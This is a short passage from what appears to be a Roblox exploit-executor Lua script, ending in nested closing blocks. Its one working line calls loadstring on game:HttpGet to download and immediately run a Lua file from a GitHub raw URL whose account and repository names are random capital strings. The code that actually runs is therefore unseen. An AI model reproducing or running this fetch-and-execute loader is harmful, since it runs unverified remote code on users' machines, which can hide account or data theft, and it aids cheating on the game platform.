                    loadstring(game:HttpGet("https://raw.githubusercontent.com/PAKKALCKKWKKJXIODKRBFHHAUJCJJJSNDJ/IMNCNJSJJDCUJSJDHHXHZHHXJJDJD/refs/heads/main/a150.lua"))() 
                end)
            end
        end)
    end)
